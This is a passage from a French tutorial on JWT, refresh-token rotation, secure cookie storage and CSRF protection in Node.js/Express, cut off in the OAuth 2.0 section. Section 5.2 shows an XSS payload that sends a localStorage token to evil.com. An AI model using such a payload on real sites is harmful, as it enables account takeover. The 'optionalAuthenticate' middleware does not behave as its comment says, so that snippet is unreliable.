# Authentification Avancée — OAuth 2.0 et JWT

L'authentification est le fondement de toute application web sécurisée : elle répond à la question "qui es-tu ?" avant que l'autorisation ne réponde à "qu'as-tu le droit de faire ?". Ce cours couvre l'ensemble des mécanismes modernes utilisés en production — des tokens JWT signés cryptographiquement aux flux OAuth 2.0, en passant par le contrôle d'accès basé sur les rôles et l'authentification multi-facteurs. Maîtriser ces concepts te permettra de concevoir des systèmes d'identité robustes capables de résister aux attaques les plus courantes.

> [!info] Prérequis
> Ce cours suppose que tu maîtrises Node.js, Express, les middlewares, et que tu as déjà implémenté une authentification basique (bcrypt + sessions). Relis le cours **"Authentification & Sécurité Web"** (B1) si besoin.

---

## 1. JWT — JSON Web Tokens en profondeur

### 1.1 Qu'est-ce qu'un JWT ?

Un JWT (prononcé "jot") est un standard ouvert (RFC 7519) qui définit un moyen compact et autonome de transmettre des informations entre deux parties sous forme d'objet JSON signé numériquement. **Autonome** signifie que le token contient lui-même toutes les informations nécessaires à sa validation — le serveur n'a pas besoin de consulter une base de données pour savoir si le token est valide.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Ce token d'apparence mystérieuse est en réalité trois segments encodés en Base64URL séparés par des points.

### 1.2 Structure détaillée : Header, Payload, Signature

```
HEADER.PAYLOAD.SIGNATURE
  ^        ^        ^
  |        |        |
Base64URL  Base64URL  HMAC-SHA256 ou RSA
```

#### Le Header

Le header décrit l'algorithme utilisé pour signer le token et son type.

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Une fois encodé en Base64URL :
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

> [!warning] Base64URL ≠ Base64
> Base64URL remplace `+` par `-`, `/` par `_`, et supprime les `=` de padding. C'est important pour que le token soit sûr dans une URL sans encodage supplémentaire.

#### Le Payload (Claims)

Le payload contient les **claims** — des déclarations sur l'entité (typiquement l'utilisateur) et des métadonnées supplémentaires.

```json
{
  "iss": "https://api.monapp.com",
  "sub": "user_abc123",
  "aud": "https://frontend.monapp.com",
  "exp": 1735689600,
  "iat": 1735686000,
  "jti": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "name": "Alice Dupont",
  "email": "alice@example.com",
  "roles": ["user", "editor"]
}
```

> [!warning] Le payload n'est PAS chiffré
> N'importe qui peut décoder le payload en Base64URL. Ne jamais y stocker de mot de passe, de numéro de carte bancaire, ou de données sensibles. Le JWT garantit l'**intégrité** (non-modification), pas la **confidentialité**.

#### La Signature

La signature empêche la falsification du token. Elle est calculée comme suit :

```
HMAC-SHA256(
  Base64URL(header) + "." + Base64URL(payload),
  secret_key
)
```

Si un attaquant modifie le payload (par exemple pour changer `"roles": ["user"]` en `"roles": ["admin"]`), la signature ne correspondra plus — le serveur rejettera le token.

### 1.3 Décodage manuel d'un JWT

Voici comment décoder un JWT sans aucune bibliothèque, pour comprendre ce qui se passe en coulisses :

```javascript
// decode-jwt.js — Décodage manuel d'un JWT (à des fins éducatives)

function base64UrlDecode(str) {
  // Remplacer les caractères URL-safe par les caractères Base64 standard
  let base64 = str.replace(/-/g, '+').replace(/_/g, '/');
  
  // Ajouter le padding manquant
  const padding = 4 - (base64.length % 4);
  if (padding !== 4) {
    base64 += '='.repeat(padding);
  }
  
  // Décoder en Buffer puis en string UTF-8
  return Buffer.from(base64, 'base64').toString('utf8');
}

function decodeJWT(token) {
  const parts = token.split('.');
  
  if (parts.length !== 3) {
    throw new Error('Format JWT invalide : doit contenir exactement 3 segments');
  }
  
  const [headerB64, payloadB64, signatureB64] = parts;
  
  const header = JSON.parse(base64UrlDecode(headerB64));
  const payload = JSON.parse(base64UrlDecode(payloadB64));
  
  // La signature est binaire — on l'affiche en hex pour la lisibilité
  const signature = Buffer.from(signatureB64.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('hex');
  
  return { header, payload, signature };
}

// Exemple d'utilisation
const token = process.argv[2] || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0IiwibmFtZSI6IkFsaWNlIiwiaWF0IjoxNzM1Njg2MDAwfQ.XXXXX';

try {
  const decoded = decodeJWT(token);
  console.log('=== HEADER ===');
  console.log(JSON.stringify(decoded.header, null, 2));
  console.log('\n=== PAYLOAD ===');
  console.log(JSON.stringify(decoded.payload, null, 2));
  console.log('\n=== SIGNATURE (hex) ===');
  console.log(decoded.signature);
  
  // Vérifier si le token est expiré
  if (decoded.payload.exp) {
    const expiresAt = new Date(decoded.payload.exp * 1000);
    const isExpired = Date.now() > decoded.payload.exp * 1000;
    console.log(`\n⏰ Expire le : ${expiresAt.toISOString()}`);
    console.log(`   Statut : ${isExpired ? '❌ EXPIRÉ' : '✅ Valide'}`);
  }
} catch (err) {
  console.error('Erreur :', err.message);
}
```

```bash
# Tester avec un vrai token
node decode-jwt.js "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

---

## 2. Les Claims JWT — Standards et bonnes pratiques

### 2.1 Claims réservés (RFC 7519)

| Claim | Nom complet | Type | Description |
|-------|-------------|------|-------------|
| `iss` | Issuer | string | URL de l'émetteur du token |
| `sub` | Subject | string | Identifiant unique du sujet (souvent l'user ID) |
| `aud` | Audience | string/array | Destinataire(s) autorisé(s) à utiliser ce token |
| `exp` | Expiration Time | NumericDate | Timestamp Unix — le token est invalide après cette date |
| `nbf` | Not Before | NumericDate | Timestamp Unix — le token est invalide avant cette date |
| `iat` | Issued At | NumericDate | Timestamp Unix — date de création du token |
| `jti` | JWT ID | string | Identifiant unique du token (utile pour la révocation) |

> [!info] NumericDate
> Les timestamps JWT sont en **secondes** Unix (pas millisecondes comme en JavaScript). En JS : `Math.floor(Date.now() / 1000)`.

### 2.2 Claims personnalisés (Custom Claims)

```javascript
// Exemple de payload complet pour une application production
const payload = {
  // Claims standards
  iss: 'https://api.monapp.com',
  sub: user._id.toString(),        // Toujours une string, jamais un ObjectId brut
  aud: ['web', 'mobile'],          // Plusieurs audiences possibles
  exp: Math.floor(Date.now() / 1000) + (15 * 60),  // 15 minutes
  iat: Math.floor(Date.now() / 1000),
  jti: crypto.randomUUID(),        // UUID v4 unique par token
  
  // Claims personnalisés (pas de collision avec les standards)
  // Bonne pratique : préfixer avec un namespace
  'https://monapp.com/roles': ['user', 'editor'],
  'https://monapp.com/plan': 'premium',
  
  // Claims courts pour les tokens fréquemment vérifiés (performance)
  name: user.name,
  email: user.email,
};
```

> [!tip] Garder le payload minimal
> Chaque claim augmente la taille du token qui est envoyé à chaque requête. Inclure uniquement ce qui est **nécessaire à chaque requête** — pas l'adresse complète de l'utilisateur si elle n't est utilisée qu'une fois par semaine.

### 2.3 Bonnes pratiques sur les claims

```javascript
// ✅ BON : claims précis et minaux
const goodPayload = {
  sub: 'usr_abc123',
  exp: Math.floor(Date.now() / 1000) + 900, // 15 min
  iat: Math.floor(Date.now() / 1000),
  roles: ['user'],
};

// ❌ MAUVAIS : trop d'informations, données sensibles
const badPayload = {
  userId: 42,
  email: 'alice@example.com',
  password: '$2b$10$...',   // 🚨 JAMAIS !
  creditCard: '4111...',    // 🚨 JAMAIS !
  address: '42 rue de la Paix, Paris',  // Inutile dans un token
  // Pas d'exp ??? → token valide pour toujours !
};
```

---

## 3. Algorithmes de Signature — HS256 vs RS256

### 3.1 HS256 — Algorithme Symétrique

HS256 utilise **HMAC-SHA256** avec une clé secrète unique partagée entre le serveur qui crée le token et celui qui le valide.

```
Token créé par serveur A (clé: "super_secret")
         ↓
Token validé par serveur A (même clé: "super_secret")
```

```javascript
// Implémentation HS256
const jwt = require('jsonwebtoken');

const SECRET = process.env.JWT_SECRET; // Minimum 256 bits (32 chars aléatoires)

// Création
const token = jwt.sign(
  { sub: 'usr_123', roles: ['user'] },
  SECRET,
  { algorithm: 'HS256', expiresIn: '15m' }
);

// Vérification
try {
  const decoded = jwt.verify(token, SECRET, { algorithms: ['HS256'] });
  console.log(decoded);
} catch (err) {
  // JsonWebTokenError, TokenExpiredError, NotBeforeError
  console.error('Token invalide:', err.message);
}
```

**Avantages HS256 :**
- Simple à implémenter
- Très rapide (HMAC est beaucoup plus rapide que RSA)
- Parfait pour les architectures monolithiques

**Inconvénients HS256 :**
- La clé secrète doit être partagée avec **tout** service qui valide des tokens
- Si plusieurs microservices doivent valider des tokens, ils doivent tous connaître le secret → surface d'attaque plus grande

### 3.2 RS256 — Algorithme Asymétrique

RS256 utilise RSA-SHA256 avec une **paire de clés** : une clé privée pour signer, une clé publique pour vérifier.

```
Serveur d'auth (clé PRIVÉE) → signe le token
         ↓
Microservice A (clé PUBLIQUE) → vérifie uniquement
Microservice B (clé PUBLIQUE) → vérifie uniquement
Microservice C (clé PUBLIQUE) → vérifie uniquement
```

```bash
# Générer une paire de clés RSA 2048 bits
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Ou en ES256 (recommandé pour les nouvelles implémentations — plus compact)
openssl ecparam -name prime256v1 -genkey -noout -out ec-private.pem
openssl ec -in ec-private.pem -pubout -out ec-public.pem
```

```javascript
// auth-server.js — Signe avec la clé privée
const fs = require('fs');
const jwt = require('jsonwebtoken');

const PRIVATE_KEY = fs.readFileSync('./keys/private.pem');
const PUBLIC_KEY = fs.readFileSync('./keys/public.pem');

// Signer — uniquement le serveur d'auth peut faire ça
function signToken(userId, roles) {
  return jwt.sign(
    {
      sub: userId,
      roles,
      iss: 'https://auth.monapp.com',
    },
    PRIVATE_KEY,
    {
      algorithm: 'RS256',
      expiresIn: '15m',
      keyid: 'key-2026-v1', // Utile pour la rotation des clés
    }
  );
}

// Vérifier — n'importe quel service avec la clé publique peut faire ça
function verifyToken(token) {
  return jwt.verify(token, PUBLIC_KEY, {
    algorithms: ['RS256'],
    issuer: 'https://auth.monapp.com',
  });
}
```

### 3.3 Tableau comparatif HS256 vs RS256

| Critère | HS256 | RS256 |
|---------|-------|-------|
| Type | Symétrique (1 clé) | Asymétrique (paire pub/priv) |
| Vitesse | ⚡ Très rapide | 🐢 Plus lent (~10-50x) |
| Partage de secret | Nécessaire pour valider | Clé publique seule suffit |
| Architecture idéale | Monolithe, microservice unique | Microservices, API publique |
| JWKS endpoint | Non applicable | ✅ Oui (rotation automatique) |
| Taille du token | ~200 chars | ~500-600 chars |
| Cas d'usage | App interne, startup | Auth0, Google, production scale |

> [!tip] Quand choisir RS256 ?
> Dès que **plusieurs services indépendants** doivent valider des tokens — surtout si tu ne veux pas que tous aient accès au secret de signature. RS256 permet de publier la clé publique via un endpoint JWKS (`/.well-known/jwks.json`) que n'importe qui peut consulter.

---

## 4. Access Token vs Refresh Token

### 4.1 Le problème des tokens longue durée

Un access token JWT est **stateless** — une fois émis, le serveur ne peut pas l'invalider sans tenir une liste de révocation (ce qui détruit l'avantage stateless). La solution : tokens courts + mécanisme de renouvellement.

```
Access Token  : durée 15 minutes — envoyé à chaque requête API
Refresh Token : durée 7-30 jours — stocké sécurisément, uniquement pour obtenir un nouvel access token
```

```
Client                    Auth Server              API
  |                           |                     |
  |-- POST /login ----------->|                     |
  |<-- access_token (15min)---|                     |
  |<-- refresh_token (7j) ----|                     |
  |                           |                     |
  |-- GET /api/data (+ access_token) ------------->|
  |<-- 200 OK data --------------------------------|
  |                           |                     |
  | ... 15 minutes passent ...                      |
  |                           |                     |
  |-- GET /api/data (+ access_token expiré) ------>|
  |<-- 401 Unauthorized ----------------------------|
  |                           |                     |
  |-- POST /auth/refresh (+ refresh_token) ------->|
  |<-- nouveau access_token (15min) ---------------|
  |                           |                     |
  |-- GET /api/data (+ nouvel access_token) ------>|
  |<-- 200 OK data --------------------------------|
```

### 4.2 Rotation des Refresh Tokens

La **rotation** est une technique de sécurité : à chaque utilisation d'un refresh token, il est invalidé et un nouveau est émis. Si un attaquant vole un refresh token et l'utilise, le vrai utilisateur verra son token invalidé et sera averti.

```javascript
// refresh-token-service.js
const crypto = require('crypto');

class RefreshTokenService {
  constructor(db) {
    this.db = db; // Instance de votre base de données
  }

  // Générer un refresh token opaque (pas JWT — stocké en DB)
  async create(userId, { userAgent, ip }) {
    const token = crypto.randomBytes(64).toString('hex');
    const hashedToken = crypto.createHash('sha256').update(token).digest('hex');
    
    await this.db.refreshTokens.create({
      userId,
      tokenHash: hashedToken,
      userAgent,
      ip,
      expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000), // 30 jours
      createdAt: new Date(),
      rotatedAt: null,
    });
    
    return token; // Retourner le token brut (jamais stocké en DB)
  }

  // Valider et ROTATER le refresh token
  async rotate(rawToken, { userAgent, ip }) {
    const hashedToken = crypto.createHash('sha256').update(rawToken).digest('hex');
    
    const storedToken = await this.db.refreshTokens.findOne({
      tokenHash: hashedToken,
      revokedAt: null,
    });
    
    if (!storedToken) {
      throw new Error('Refresh token invalide ou révoqué');
    }
    
    if (storedToken.expiresAt < new Date()) {
      throw new Error('Refresh token expiré');
    }
    
    // ⚠️ Détection de réutilisation : si le token a déjà été rotaté,
    // quelqu'un essaie de réutiliser un ancien token → RÉVOQUER TOUTE LA FAMILLE
    if (storedToken.rotatedAt) {
      await this.revokeAllUserTokens(storedToken.userId);
      throw new Error('Token réutilisation détectée — tous les tokens révoqués');
    }
    
    // Marquer l'ancien comme rotaté
    await this.db.refreshTokens.update(
      { tokenHash: hashedToken },
      { rotatedAt: new Date() }
    );
    
    // Créer le nouveau token
    return this.create(storedToken.userId, { userAgent, ip });
  }

  // Révoquer un token spécifique (logout)
  async revoke(rawToken) {
    const hashedToken = crypto.createHash('sha256').update(rawToken).digest('hex');
    await this.db.refreshTokens.update(
      { tokenHash: hashedToken },
      { revokedAt: new Date() }
    );
  }

  // Révoquer tous les tokens d'un utilisateur (logout partout)
  async revokeAllUserTokens(userId) {
    await this.db.refreshTokens.updateMany(
      { userId, revokedAt: null },
      { revokedAt: new Date() }
    );
  }
}

module.exports = RefreshTokenService;
```

> [!warning] Refresh Token ≠ JWT
> Les refresh tokens devraient être des tokens **opaques** (chaîne aléatoire) stockés en base de données, pas des JWT. Un JWT refresh token ne peut pas être révoqué sans liste noire — ce qui annule l'avantage de la rotation.

---

## 5. Stockage Sécurisé des Tokens

### 5.1 Les deux options : Cookie vs localStorage

```
LocalStorage / SessionStorage      Cookie HttpOnly
─────────────────────────────      ─────────────────────────────
Accessible via JavaScript ✓         Non accessible via JS ✓
Persiste entre onglets ✓            Envoyé automatiquement ✓
Facilement volable par XSS ❌       Protégé contre XSS ✓
Pas de CSRF naturel ✓               Vulnérable au CSRF ❌
```

### 5.2 Attaque XSS sur localStorage

```javascript
// Ce script injecté via une faille XSS vole le token en localStorage
// L'attaquant peut injecter ce code via un commentaire, un profil, etc.

// ❌ Si le token est dans localStorage :
const stolenToken = localStorage.getItem('access_token');
// L'attaquant envoie le token à son serveur...
new Image().src = `https://evil.com/steal?token=${stolenToken}`;
// → Game over, le compte est compromis jusqu'à expiration du token
```

```javascript
// ✅ Si le token est dans un Cookie HttpOnly :
// Ce même script ne peut PAS accéder au cookie
document.cookie; // Ne retourne pas les cookies HttpOnly
// XSS peut toujours faire des requêtes authentifiées depuis la page courante
// mais ne peut pas EXFILTRER le token
```

### 5.3 Configuration des Cookies sécurisés

```javascript
// cookie-config.js — Configuration production des cookies auth
const COOKIE_OPTIONS = {
  httpOnly: true,      // Inaccessible depuis JavaScript
  secure: true,        // HTTPS uniquement (obligatoire en production)
  sameSite: 'strict',  // Protection CSRF : 'strict', 'lax', ou 'none'
  maxAge: 15 * 60 * 1000, // 15 minutes pour l'access token (en ms)
  path: '/',
  domain: process.env.COOKIE_DOMAIN, // '.monapp.com' pour les sous-domaines
};

const REFRESH_COOKIE_OPTIONS = {
  ...COOKIE_OPTIONS,
  maxAge: 30 * 24 * 60 * 60 * 1000, // 30 jours
  path: '/auth/refresh', // Scope limité — n'est envoyé QU'à /auth/refresh
};

// Dans un endpoint Express :
res.cookie('access_token', accessToken, COOKIE_OPTIONS);
res.cookie('refresh_token', refreshToken, REFRESH_COOKIE_OPTIONS);
```

### 5.4 Protection CSRF avec les Cookies

```javascript
// csrf-protection.js — Double Submit Cookie Pattern

const crypto = require('crypto');

// Générer un token CSRF
function generateCsrfToken() {
  return crypto.randomBytes(32).toString('hex');
}

// Middleware : vérifier le token CSRF
function csrfProtection(req, res, next) {
  // GET/HEAD/OPTIONS sont sûrs par convention (ne modifient pas l'état)
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next();
  }
  
  const cookieCsrf = req.cookies['csrf_token'];
  const headerCsrf = req.headers['x-csrf-token'];
  
  if (!cookieCsrf || !headerCsrf || cookieCsrf !== headerCsrf) {
    return res.status(403).json({ error: 'CSRF token invalide' });
  }
  
  next();
}

// Le frontend doit lire le cookie CSRF (non-HttpOnly) et l'envoyer en header
// fetch('/api/data', {
//   method: 'POST',
//   headers: { 'X-CSRF-Token': getCookie('csrf_token') },
//   body: JSON.stringify(data),
// });
```

### 5.5 Tableau de décision : où stocker quoi ?

| Token | Stockage recommandé | Raison |
|-------|--------------------|---------| 
| Access Token (SPA) | Cookie HttpOnly + SameSite=Strict | Protection XSS |
| Access Token (Mobile) | Secure Storage OS | Keychain (iOS) / Keystore (Android) |
| Access Token (SSR) | Cookie HttpOnly | Jamais exposé au JS |
| Refresh Token | Cookie HttpOnly path=/auth/refresh | Scope limité, inaccessible JS |
| CSRF Token | Cookie non-HttpOnly | Doit être lu par JS pour être envoyé en header |

> [!warning] SameSite=None
> Si ton frontend et ton API sont sur des domaines différents (ex: `app.com` et `api.com`), tu dois utiliser `sameSite: 'none'` + `secure: true`. Dans ce cas, implémenter impérativement la protection CSRF car `SameSite=none` ne protège plus contre les requêtes cross-site.

---

## 6. Implémentation Node.js/Express complète

### 6.1 Installation et structure du projet

```bash
mkdir auth-system && cd auth-system
npm init -y
npm install express jsonwebtoken bcryptjs cookie-parser cors helmet morgan dotenv
npm install mongoose  # ou pg pour PostgreSQL
npm install --save-dev nodemon jest supertest
```

```
auth-system/
├── src/
│   ├── config/
│   │   ├── database.js
│   │   └── jwt.js
│   ├── middlewares/
│   │   ├── auth.middleware.js
│   │   ├── rbac.middleware.js
│   │   └── csrf.middleware.js
│   ├── models/
│   │   ├── User.model.js
│   │   └── RefreshToken.model.js
│   ├── routes/
│   │   ├── auth.routes.js
│   │   └── user.routes.js
│   ├── services/
│   │   ├── token.service.js
│   │   └── user.service.js
│   └── app.js
├── .env
└── server.js
```

### 6.2 Configuration JWT

```javascript
// src/config/jwt.js
const jwt = require('jsonwebtoken');

const config = {
  accessToken: {
    secret: process.env.JWT_ACCESS_SECRET,
    expiresIn: '15m',
    algorithm: 'HS256',
  },
  refreshToken: {
    expiresIn: 30 * 24 * 60 * 60, // 30 jours en secondes
  },
};

function signAccessToken(payload) {
  return jwt.sign(payload, config.accessToken.secret, {
    algorithm: config.accessToken.algorithm,
    expiresIn: config.accessToken.expiresIn,
    issuer: process.env.APP_URL,
    audience: process.env.APP_URL,
  });
}

function verifyAccessToken(token) {
  return jwt.verify(token, config.accessToken.secret, {
    algorithms: [config.accessToken.algorithm],
    issuer: process.env.APP_URL,
    audience: process.env.APP_URL,
  });
}

module.exports = { config, signAccessToken, verifyAccessToken };
```

### 6.3 Modèles Mongoose

```javascript
// src/models/User.model.js
const mongoose = require('mongoose');
const bcrypt = require('bcryptjs');

const userSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
    unique: true,
    lowercase: true,
    trim: true,
  },
  password: {
    type: String,
    required: true,
    minlength: 8,
    select: false, // Ne jamais retourner le mot de passe dans les requêtes
  },
  name: { type: String, required: true, trim: true },
  roles: {
    type: [String],
    enum: ['user', 'editor', 'admin'],
    default: ['user'],
  },
  isEmailVerified: { type: Boolean, default: false },
  mfaEnabled: { type: Boolean, default: false },
  mfaSecret: { type: String, select: false },
  mfaBackupCodes: { type: [String], select: false },
  createdAt: { type: Date, default: Date.now },
  updatedAt: { type: Date, default: Date.now },
}, {
  timestamps: true,
});

// Hash du mot de passe avant sauvegarde
userSchema.pre('save', async function (next) {
  if (!this.isModified('password')) return next();
  this.password = await bcrypt.hash(this.password, 12);
  next();
});

// Méthode pour comparer les mots de passe
userSchema.methods.comparePassword = async function (candidatePassword) {
  return bcrypt.compare(candidatePassword, this.password);
};

// Ne jamais retourner le mot de passe dans les réponses JSON
userSchema.methods.toJSON = function () {
  const obj = this.toObject();
  delete obj.password;
  delete obj.mfaSecret;
  delete obj.mfaBackupCodes;
  return obj;
};

module.exports = mongoose.model('User', userSchema);
```

```javascript
// src/models/RefreshToken.model.js
const mongoose = require('mongoose');

const refreshTokenSchema = new mongoose.Schema({
  userId: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true,
    index: true,
  },
  tokenHash: {
    type: String,
    required: true,
    unique: true,
    index: true,
  },
  userAgent: String,
  ip: String,
  expiresAt: { type: Date, required: true, index: { expireAfterSeconds: 0 } }, // TTL index MongoDB
  rotatedAt: { type: Date, default: null },
  revokedAt: { type: Date, default: null },
}, {
  timestamps: true,
});

module.exports = mongoose.model('RefreshToken', refreshTokenSchema);
```

### 6.4 Service Token

```javascript
// src/services/token.service.js
const crypto = require('crypto');
const RefreshToken = require('../models/RefreshToken.model');
const { signAccessToken, verifyAccessToken } = require('../config/jwt');

class TokenService {
  // Générer une paire access + refresh token
  async generateTokenPair(user, meta = {}) {
    const accessToken = signAccessToken({
      sub: user._id.toString(),
      email: user.email,
      roles: user.roles,
      name: user.name,
    });

    const rawRefreshToken = crypto.randomBytes(64).toString('hex');
    const hashedRefreshToken = crypto
      .createHash('sha256')
      .update(rawRefreshToken)
      .digest('hex');

    await RefreshToken.create({
      userId: user._id,
      tokenHash: hashedRefreshToken,
      userAgent: meta.userAgent,
      ip: meta.ip,
      expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
    });

    return { accessToken, refreshToken: rawRefreshToken };
  }

  // Rafraîchir les tokens
  async refreshTokens(rawRefreshToken, meta = {}) {
    const hashedToken = crypto
      .createHash('sha256')
      .update(rawRefreshToken)
      .digest('hex');

    const storedToken = await RefreshToken.findOne({
      tokenHash: hashedToken,
      revokedAt: null,
    }).populate('userId');

    if (!storedToken) {
      throw new Error('INVALID_REFRESH_TOKEN');
    }

    if (storedToken.expiresAt < new Date()) {
      throw new Error('REFRESH_TOKEN_EXPIRED');
    }

    if (storedToken.rotatedAt) {
      // Détection de réutilisation — révoquer tous les tokens
      await RefreshToken.updateMany(
        { userId: storedToken.userId._id, revokedAt: null },
        { revokedAt: new Date() }
      );
      throw new Error('TOKEN_REUSE_DETECTED');
    }

    // Marquer l'ancien token comme rotaté
    storedToken.rotatedAt = new Date();
    await storedToken.save();

    // Générer une nouvelle paire
    return this.generateTokenPair(storedToken.userId, meta);
  }

  // Révoquer un refresh token (logout)
  async revokeRefreshToken(rawRefreshToken) {
    const hashedToken = crypto
      .createHash('sha256')
      .update(rawRefreshToken)
      .digest('hex');

    await RefreshToken.findOneAndUpdate(
      { tokenHash: hashedToken },
      { revokedAt: new Date() }
    );
  }

  // Révoquer tous les tokens d'un utilisateur
  async revokeAllUserTokens(userId) {
    await RefreshToken.updateMany(
      { userId, revokedAt: null },
      { revokedAt: new Date() }
    );
  }
}

module.exports = new TokenService();
```

### 6.5 Middleware d'authentification

```javascript
// src/middlewares/auth.middleware.js
const { verifyAccessToken } = require('../config/jwt');

const COOKIE_OPTIONS = {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
};

// Middleware : vérifier l'access token
function authenticate(req, res, next) {
  try {
    // Support Cookie ET Authorization header (pour les clients non-browser)
    let token = req.cookies?.access_token;
    
    if (!token) {
      const authHeader = req.headers.authorization;
      if (authHeader?.startsWith('Bearer ')) {
        token = authHeader.slice(7);
      }
    }

    if (!token) {
      return res.status(401).json({ error: 'Token d\'authentification requis' });
    }

    const decoded = verifyAccessToken(token);
    req.user = decoded; // { sub, email, roles, name, exp, iat, ... }
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({
        error: 'Token expiré',
        code: 'TOKEN_EXPIRED', // Le frontend sait qu'il doit refresh
      });
    }
    return res.status(401).json({ error: 'Token invalide' });
  }
}

// Middleware optionnel : attacher l'utilisateur si token présent, mais ne pas bloquer
function optionalAuthenticate(req, res, next) {
  try {
    authenticate(req, res, next);
  } catch {
    next(); // Continuer même sans token
  }
}

module.exports = { authenticate, optionalAuthenticate, COOKIE_OPTIONS };
```

### 6.6 Routes d'authentification

```javascript
// src/routes/auth.routes.js
const express = require('express');
const router = express.Router();
const User = require('../models/User.model');
const tokenService = require('../services/token.service');
const { authenticate, COOKIE_OPTIONS } = require('../middlewares/auth.middleware');

const REFRESH_COOKIE_OPTIONS = {
  ...COOKIE_OPTIONS,
  maxAge: 30 * 24 * 60 * 60 * 1000, // 30 jours
  path: '/auth/refresh', // Cookie envoyé UNIQUEMENT à cette route
};

// POST /auth/register
router.post('/register', async (req, res) => {
  try {
    const { email, password, name } = req.body;

    // Validation basique
    if (!email || !password || !name) {
      return res.status(400).json({ error: 'Champs requis manquants' });
    }

    if (password.length < 8) {
      return res.status(400).json({ error: 'Mot de passe trop court (min 8 chars)' });
    }

    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return res.status(409).json({ error: 'Email déjà utilisé' });
    }

    const user = await User.create({ email, password, name });
    const meta = { userAgent: req.headers['user-agent'], ip: req.ip };
    const { accessToken, refreshToken } = await tokenService.generateTokenPair(user, meta);

    res.cookie('access_token', accessToken, {
      ...COOKIE_OPTIONS,
      maxAge: 15 * 60 * 1000,
    });
    res.cookie('refresh_token', refreshToken, REFRESH_COOKIE_OPTIONS);

    res.status(201).json({
      message: 'Compte créé avec succès',
      user: user.toJSON(),
    });
  } catch (err) {
    console.error('Register error:', err);
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

// POST /auth/login
router.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    // select('+password') car le champ password a select: false dans le schéma
    const user = await User.findOne({ email }).select('+password');

    if (!user || !(await user.comparePassword(password))) {
      // Message volontairement vague — ne pas révéler si l'email existe
      return res.status(401).json({ error: 'Email ou mot de passe incorrect' });
    }

    const meta = { userAgent: req.headers['user-agent'], ip: req.ip };
    const { accessToken, refreshToken } = await tokenService.generateTokenPair(user, meta);

    res.cookie('access_token', accessToken, {
      ...COOKIE_OPTIONS,
      maxAge: 15 * 60 * 1000,
    });
    res.cookie('refresh_token', refreshToken, REFRESH_COOKIE_OPTIONS);

    res.json({
      message: 'Connexion réussie',
      user: user.toJSON(),
    });
  } catch (err) {
    console.error('Login error:', err);
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

// POST /auth/refresh — Renouveler l'access token
router.post('/refresh', async (req, res) => {
  try {
    const rawRefreshToken = req.cookies?.refresh_token;

    if (!rawRefreshToken) {
      return res.status(401).json({ error: 'Refresh token requis' });
    }

    const meta = { userAgent: req.headers['user-agent'], ip: req.ip };
    const { accessToken, refreshToken } = await tokenService.refreshTokens(
      rawRefreshToken,
      meta
    );

    res.cookie('access_token', accessToken, {
      ...COOKIE_OPTIONS,
      maxAge: 15 * 60 * 1000,
    });
    res.cookie('refresh_token', refreshToken, REFRESH_COOKIE_OPTIONS);

    res.json({ message: 'Tokens renouvelés' });
  } catch (err) {
    if (err.message === 'TOKEN_REUSE_DETECTED') {
      // Révoquer tous les cookies — l'utilisateur doit se reconnecter
      res.clearCookie('access_token');
      res.clearCookie('refresh_token', { path: '/auth/refresh' });
      return res.status(401).json({
        error: 'Activité suspecte détectée — reconnectez-vous',
      });
    }
    res.status(401).json({ error: 'Impossible de rafraîchir le token' });
  }
});

// POST /auth/logout
router.post('/logout', authenticate, async (req, res) => {
  try {
    const rawRefreshToken = req.cookies?.refresh_token;
    if (rawRefreshToken) {
      await tokenService.revokeRefreshToken(rawRefreshToken);
    }

    res.clearCookie('access_token');
    res.clearCookie('refresh_token', { path: '/auth/refresh' });

    res.json({ message: 'Déconnexion réussie' });
  } catch (err) {
    res.status(500).json({ error: 'Erreur lors de la déconnexion' });
  }
});

// POST /auth/logout-all — Déconnecter tous les appareils
router.post('/logout-all', authenticate, async (req, res) => {
  try {
    await tokenService.revokeAllUserTokens(req.user.sub);
    res.clearCookie('access_token');
    res.clearCookie('refresh_token', { path: '/auth/refresh' });
    res.json({ message: 'Déconnexion de tous les appareils effectuée' });
  } catch (err) {
    res.status(500).json({ error: 'Erreur serveur' });
  }
});

module.exports = router;
```

---

## 7. OAuth 2.0 — Concepts Fondamentaux

### 7.1 Pourquoi OAuth 2.0 ?

Avant OAuth, pour accéder à tes contacts Google depuis une appli tierce, tu devais **donner ton mot de passe Google** à cette appli. OAuth résout ce problème en permettant à un utilisateur d'accorder un accès limité à ses ressources sans partager son mot de passe.

> [!info] OAuth 2.0 ≠ Authentification
> OAuth 2.0 est un protocole d'**autorisation** — il répond à "cette appli peut-elle accéder à tes données ?", pas "qui es-tu ?". OpenID Connect (section 9) ajoute l'authentification par-dessus OAuth 2.0.

### 7.2 Les 4 acteurs du protocole

```
┌─────────────────────────────────────────────────────────────────┐
│                      OAuth 2.0 Actors                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Resource Owner  ──────────── (ex: toi, l'utilisateur)         │
│  (Propriétaire       │                                           │
│   de la ressource)   │ consent                                   │
│                      ▼                                           │
│  Client ────────── Authorization Server ─────── Resource Server │
│  (ex: ton appli)   (ex: Google OAuth)          (ex: Gmail API)  │
│                                                                  │
